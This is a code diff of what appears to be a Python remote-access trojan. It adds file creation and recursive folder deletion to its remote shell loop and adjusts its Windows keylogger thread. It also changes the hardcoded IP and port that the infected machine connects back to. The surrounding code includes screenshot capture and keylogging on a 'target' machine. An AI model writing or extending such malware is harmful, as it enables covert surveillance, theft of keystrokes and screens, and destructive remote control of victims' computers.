@@ -12,6 +12,7 @@ import PIL.ImageGrab           # python library for taking screenshot
 
 from termcolor import colored  # python coloring library
 
+import shutil                  # shutil module enables us to operate with file objects easily and without diving into file objects a lot
 
 from lnx_keylogger import *
 
@@ -127,6 +128,8 @@ def win_keylog(cmd):
 	# keylogger on
 	if cmd[:9] == 'keylog_on' and len(cmd) > 1:
 
+		global t
+
 		w_keylog = Win_Keylogger()
 		t = threading.Thread(target=w_keylog.keylog_start)
 
@@ -175,6 +178,15 @@ def shell():
 		elif (cmd == "cls") or (cmd == "clear"): # ✓
 			pass
 
+
+		# making file on linux
+		elif cmd[:5] == "touch" and len(cmd) > 1:
+
+			file = open(cmd[6:], "w")
+
+			file.close()
+
+
 		# Changing directory ✓
 		elif cmd[:2] == "cd" and len(cmd) > 1:
 
@@ -185,17 +197,22 @@ def shell():
 			except:
 				continue
 
-		# Removing file path in linux ✓
-		elif cmd[:2] == "rm" and len(cmd) > 1:
+		# Removing folder in linux and Win
+		elif (cmd[:2] == 'rm' and cmd.find('-r') and len(cmd) > 1) or (cmd[:5] == 'rmdir' and len(cmd) > 1):
 
 			try:
-				os.remove(cmd[3:])       # remove specified file path
+				pwd = os.getcwd()
+
+				abs_path = pwd + '/' + cmd[6:]
+
+				shutil.rmtree(abs_path)
 
 			except:
-				continue                 # we know that after removing path nothing is shown in terminal/cmd,
-							 # so we have to receive nothing as data from trgt
 
-		# Removing file path in Win ✓
+				continue                 # we know that after removing path nothing is shown in terminal/cmd,
+							 # so we have to send nothing as data from trgt
+
+		# Removing file path in Win and linux ✓
 		elif cmd[:3] == "del" and len(cmd) > 1:
 
 			try:
@@ -203,7 +220,7 @@ def shell():
 
 			except:
 				continue                 # we know that after removing path nothing is shown in terminal/cmd,
-							 # so we have to receive nothing as data from trgt
+							 # so we have to send nothing as data from trgt
 
 
 		# Screenshot ✓
@@ -224,7 +241,7 @@ def shell():
 				# Windows
 				win_keylog(cmd)
 			else:
-				#Linux
+				#Linux  ✓
 				lnx_keylog(cmd)
 
 
@@ -252,7 +269,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 # Connecting with the trgt
-sock.connect(("192.168.0.105",1234))                                            # change the ip and port
+sock.connect(("192.168.0.110",1234))                                            # change the ip and port
 
 
 
